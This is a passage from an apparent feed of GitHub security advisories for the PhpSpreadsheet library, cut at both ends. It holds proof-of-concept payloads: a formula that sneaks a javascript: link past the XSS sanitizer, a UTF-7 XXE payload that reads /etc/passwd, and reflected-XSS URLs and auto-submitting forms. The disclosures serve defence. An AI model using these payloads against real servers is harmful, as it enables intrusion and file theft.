&lt;Created&gt;2015-06-05T18:19:34Z&lt;/Created&gt; \n  &lt;LastSaved&gt;2024-12-25T10:16:07Z&lt;/LastSaved&gt; \n  &lt;Version&gt;16.00&lt;/Version&gt; \n &lt;/DocumentProperties&gt; \n &lt;OfficeDocumentSettings xmlns=\"urn:schemas-microsoft-com:office:office\"&gt; \n  &lt;AllowPNG/&gt; \n &lt;/OfficeDocumentSettings&gt; \n &lt;ExcelWorkbook xmlns=\"urn:schemas-microsoft-com:office:excel\"&gt; \n  &lt;WindowHeight&gt;11020&lt;/WindowHeight&gt; \n  &lt;WindowWidth&gt;19420&lt;/WindowWidth&gt; \n  &lt;WindowTopX&gt;32767&lt;/WindowTopX&gt; \n  &lt;WindowTopY&gt;32767&lt;/WindowTopY&gt; \n  &lt;ProtectStructure&gt;False&lt;/ProtectStructure&gt; \n  &lt;ProtectWindows&gt;False&lt;/ProtectWindows&gt; \n &lt;/ExcelWorkbook&gt; \n &lt;Styles&gt; \n  &lt;Style ss:ID=\"Default\" ss:Name=\"Normal\"&gt; \n   &lt;Alignment ss:Vertical=\"Bottom\"/&gt; \n   &lt;Borders/&gt; \n   &lt;Font ss:FontName=\"Calibri\" x:Family=\"Swiss\" ss:Size=\"11\" ss:Color=\"#000000\"/&gt; \n   &lt;Interior/&gt; \n   &lt;NumberFormat/&gt; \n   &lt;Protection/&gt; \n  &lt;/Style&gt; \n  &lt;Style ss:ID=\"s16\"&gt; \n   &lt;NumberFormat ss:Format=\"General Date\"/&gt; \n  &lt;/Style&gt; \n &lt;/Styles&gt; \n &lt;Worksheet ss:Name=\"Лист1\"&gt; \n  &lt;Table ss:ExpandedColumnCount=\"2\" ss:ExpandedRowCount=\"6\" x:FullColumns=\"1\" \n   x:FullRows=\"1\" ss:DefaultRowHeight=\"14.5\"&gt; \n   &lt;Column ss:AutoFitWidth=\"0\" ss:Width=\"194\"/&gt; \n   &lt;Row&gt; \n     &lt;Cell ss:Formula=\"=HYPERLINK (CHAR(20) &amp;amp; &amp;quot;j&amp;quot; &amp;amp; CHAR(13) &amp;amp; &amp;quot;avascript:alert(1)&amp;quot;)\"&gt;&lt;Data ss:Type=\"String\"&gt;&lt;/Data&gt;&lt;/Cell&gt; \n   &lt;/Row&gt; \n  &lt;/Table&gt; \n  &lt;WorksheetOptions xmlns=\"urn:schemas-microsoft-com:office:excel\"&gt; \n   &lt;PageSetup&gt; \n    &lt;Header x:Margin=\"0.3\"/&gt; \n    &lt;Footer x:Margin=\"0.3\"/&gt; \n    &lt;PageMargins x:Bottom=\"0.75\" x:Left=\"0.7\" x:Right=\"0.7\" x:Top=\"0.75\"/&gt; \n   &lt;/PageSetup&gt; \n   &lt;Selected/&gt; \n   &lt;TopRowVisible&gt;1&lt;/TopRowVisible&gt; \n   &lt;Panes&gt; \n    &lt;Pane&gt; \n     &lt;Number&gt;3&lt;/Number&gt; \n     &lt;ActiveRow&gt;6&lt;/ActiveRow&gt; \n    &lt;/Pane&gt; \n   &lt;/Panes&gt; \n   &lt;ProtectObjects&gt;False&lt;/ProtectObjects&gt; \n   &lt;ProtectScenarios&gt;False&lt;/ProtectScenarios&gt; \n  &lt;/WorksheetOptions&gt; \n &lt;/Worksheet&gt;\n&lt;/Workbook&gt;\n</code></pre>\n<p>Due to the load with a special character in front of the javascript protocol, the execution flow hits line 1595, not 1593.</p>\n<p><em>Figure 4. Generating a link bypassing a regular expression</em>\n<img alt=\"fig4\" src=\"https://github.com/user-attachments/assets/9bd2299d-9045-4cab-b3a5-cbcaf3bbe23c\"></p>\n<p>In the response from the server, you can see which special character is located in front of the javascript protocol after conversion.</p>\n<p><em>Figure 5. Response from the server with a special character</em>\n<img alt=\"fig5\" src=\"https://github.com/user-attachments/assets/3fecbd9b-b08e-4797-9f5d-06911f857059\"></p>\n<p>When viewing the rendered result, a link becomes visible in the browser, and when clicked, the embedded JavaScript code will be executed.</p>\n<p><em>Figure 6. Executing JavaScript code</em>\n<img src=\"https://github.com/user-attachments/assets/b8ff1aeb-ba3b-49c1-a3b4-9e2cc1fc52d1\" alt=\"fig6\" width=\"595\"></p>\n<hr>\n<h2 id=\"credit\">Credit</h2>\n<p>Igor Sak-Sakovskiy (Positive Technologies)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r57h-547h-w24f\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r57h-547h-w24f</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/cde2926a9e2baf146783f8fd1771bbed7d1dc7b3\">https://github.com/PHPOffice/PhpSpreadsheet/commit/cde2926a9e2baf146783f8fd1771bbed7d1dc7b3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23210\">https://nvd.nist.gov/vuln/detail/CVE-2025-23210</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r57h-547h-w24f\">https://github.com/advisories/GHSA-r57h-547h-w24f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r57h-547h-w24f",
            "title": "[phpoffice/phpexcel] PhpSpreadsheet allows bypassing of XSS sanitizer using the javascript protocol and special characters",
            "date_modified": "2025-03-06T18:22:56.000Z",
            "date_published": "2025-02-03T15:39:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r57h-547h-w24f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, we found another bypass than the previously reported <code>CVE-2024-47873</code>, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using a payload in the encoding UTF-7, and adding at end of the file a comment with the value <code>encoding=\"UTF-8\"</code> with <code>\"</code>, which is matched by the first regex, so that <code>encoding='UTF-7'</code> with single quotes <code>'</code> in the XML header is not matched by the second regex: </p>\n<pre><code> $patterns = [\n            '/encoding\\\\s*=\\\\s*\"([^\"]*]?)\"/',\n            \"/encoding\\\\s*=\\\\s*'([^']*?)'/\",\n        ];\n</code></pre>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&amp;input=Pz4KPCFET0NUWVBFIGZvbyBbCiAgPCFFTEVNRU5UIGZvbyBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2BCjxmb28%2BJnh4ZTs8L2Zvbz4K\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<p>To create the payload you need:</p>\n<ol>\n<li>Create a file containing <code>&lt;?xml version = \"1.0\" encoding='UTF-7'</code> in an XML file</li>\n<li>Use the link attached above to create your XXE payload and add it to the XML file. </li>\n<li>Add <code>+ADw-+ACE---encoding=\"UTF-8\"--+AD4-</code> to the end of the XML file, which is matched by the first regex.</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a></p>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17375792/payload.xlsx\">payload.xlsx</a> file in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on netcat <a href=\"http://127.0.0.1:12345/ext.dtd\">http://127.0.0.1:12345/ext.dtd</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-48917\">https://nvd.nist.gov/vuln/detail/CVE-2024-48917</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7cc9-j4mv-vcjp\">https://github.com/advisories/GHSA-7cc9-j4mv-vcjp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp",
            "title": "[phpoffice/phpexcel] XXE in PHPSpreadsheet's XLSX reader",
            "date_modified": "2025-03-06T18:22:22.000Z",
            "date_published": "2024-11-18T20:01:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7cc9-j4mv-vcjp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-the-constructor-of-the-downloader-class\">Unauthorized Reflected XSS in the constructor of the <code>Downloader</code> class</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/download.php</code> script, an attacker can perform a XSS-type attack\n<strong>Impact</strong>: execution of arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the constructor of the <code>Downloader</code> class\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the <code>name</code> and <code>type</code> variables\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in the constructor of the <code>Downloader</code> class) in Phpspreadsheet.</p>\n<p>The latest version (3.6.0) of the <code>phpoffice/phpspreadsheet</code> library was installed. The installation was carried out with the inclusion of examples.</p>\n<p><em>Listing 1. Installing the <code>phpoffice/phpspreadsheet</code> library</em></p>\n<pre><code>$ composer require phpoffice/phpspreadsheet --prefer-source\n</code></pre>\n<p>The <code>./vendor/phpoffice/phpspreadsheet/samples/download.php</code> file processes the GET parameters <code>name</code> and <code>type</code>.</p>\n<p><img alt=\"fig1\" src=\"https://github.com/user-attachments/assets/78d5b3c7-e2ab-4487-98e2-a975f74a71c0\"></p>\n<p><em>Figure 1. The <code>./vendor/phpoffice/phpspreadsheet/samples/download.php</code> file accepts GET parameters.</em></p>\n<p>Consider the constructor of the <code>Downloader</code> class, where GET parameters are passed. Error is displayed without sanitization using GET parameters transmitted from the user.</p>\n<p><img alt=\"fig2\" src=\"https://github.com/user-attachments/assets/00baf1f8-298c-4654-a3e4-b99cf8053eac\"></p>\n<p><em>Figure 2. Error is displayed without sanitization</em></p>\n<p>When clicking on the following link, arbitrary JavaScript code will be executed.</p>\n<p><em>Listing 2.</em></p>\n<pre><code>https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/download.php?name=%3Cimg%20src=1%20onerror=alert()%3E&amp;type=1\n</code></pre>\n<p>Demonstration of the execution of arbitrary JavaScript code.</p>\n<img src=\"https://github.com/user-attachments/assets/745d6e21-396f-4357-8ff8-e856adf15fee\" alt=\"fig3\" width=\"537\">\n\n<p><em>Figure 3. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jmpx-686v-c3wx\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jmpx-686v-c3wx</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4#diff-fbb0f53a5c68eeeffaa9ab35552c0b01740396f1a4045af5d2935ec2a62a7816\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4#diff-fbb0f53a5c68eeeffaa9ab35552c0b01740396f1a4045af5d2935ec2a62a7816</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56365\">https://nvd.nist.gov/vuln/detail/CVE-2024-56365</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmpx-686v-c3wx\">https://github.com/advisories/GHSA-jmpx-686v-c3wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmpx-686v-c3wx",
            "title": "[phpoffice/phpexcel] PhpSpreadsheet allows unauthorized Reflected XSS in the constructor of the Downloader class",
            "date_modified": "2025-03-06T18:21:36.000Z",
            "date_published": "2025-01-03T17:06:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmpx-686v-c3wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-the-accountingphp-file\">Unauthorized Reflected XSS in the <code>Accounting.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> script, an attacker can perform a XSS-type attack\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the currency variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Accounting.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file, which leads to the possibility of a XSS attack.\nStrings are formed using the currency parameter without sanitization, which is controlled by the attacker.</p>\n<p><img alt=\"fig7\" src=\"https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f\"></p>\n<p><em>Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"number\" value=\"1234&amp;#46;5678\" /&gt;\n      &lt;input type=\"hidden\" name=\"currency\" value=\"&amp;#36;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"decimals\" value=\"2\" /&gt;\n      &lt;input type=\"hidden\" name=\"position\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"spacing\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"submit\" value=\"Display&amp;#32;Mask\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.</p>\n<img src=\"https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1\" alt=\"fig8\" width=\"460\">\n\n<p><em>Figure 8. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56366\">https://nvd.nist.gov/vuln/detail/CVE-2024-56366</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c6fv-7vh8-2rhr\">https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c6fv-7vh8-2rhr",
            "title": "[phpoffice/phpexcel] PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file",
            "date_modified": "2025-03-06T18:20:26.000Z",
            "date_published": "2025-01-03T17:06:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c6fv-7vh8-2rhr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-convert-onlinephp-file\">Unauthorized Reflected XSS in <code>Convert-Online.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> script, an attacker can perform a XSS-type attack \n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the quantity variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Convert-Online.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php</code> file, which leads to the possibility of a XSS attack.</p>\n<p><img alt=\"fig4\" src=\"https://github.com/user-attachments/assets/71a6ab8b-db65-4e7e-bb36-39f0bd0f7077\"></p>\n<p><em>Figure 4. The message with the quantity parameter is displayed without sanitization</em></p>\n<p>The following figure shows a POST HTTP-request and a response to the server with the variable quantity, which is displayed in the response from the server without sanitization.</p>\n<img src=\"https://github.com/user-attachments/assets/022323c9-ca1e-44ea-9380-37ed7848e971\" alt=\"fig5\" width=\"460\">\n\n<p><em>Figure 5. In the server's response , the quantity variable is displayed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 3. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"category\" value=\"Weight&amp;#32;and&amp;#32;Mass\" /&gt;\n      &lt;input type=\"hidden\" name=\"quantity\" value=\"1&amp;#46;0&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"fromUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"toUnit\" value=\"g\" /&gt;\n      &lt;input type=\"hidden\" name=\"submitx\" value=\"Convert\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After the user visits the attacker's resource, the form will be sent to the vulnerable scenario, which will lead to the execution of arbitrary code in the client's browser.</p>\n<img src=\"https://github.com/user-attachments/assets/e52b68c6-5a98-4db2-85ec-5bf37e4cb625\" alt=\"fig6\" width=\"389\">\n\n<p><em>Figure 6. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-x88g-h956-m5xg</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56408\">https://nvd.nist.gov/vuln/detail/CVE-2024-56408</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x88g-h956-m5xg\">https://github.com/advisories/GHSA-x88g-h956-m5xg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg",
            "title": "[phpoffice/phpexcel] PhpSpreadsheet allows unauthorized Reflected XSS in `Convert-Online.php` file",
            "date_modified": "2025-03-06T18:19:35.000Z",
            "date_published": "2025-01-03T16:05:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x88g-h956-m5xg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-currencyphp-file\">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.\nStrings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>\n<p><img alt=\"fig9\" src=\"https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c\"></p>\n<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"number\" value=\"1234&amp;#46;5678\" /&gt;\n      &lt;input type=\"hidden\" name=\"currency\" value=\"&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"decimals\" value=\"2\" /&gt;\n      &lt;input type=\"hidden\" name=\"position\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"spacing\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"submit\" value=\"Display&amp;#32;Mask\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>\n<img src=\"https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335\" alt=\"fig10\" width=\"428\">\n\n<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a 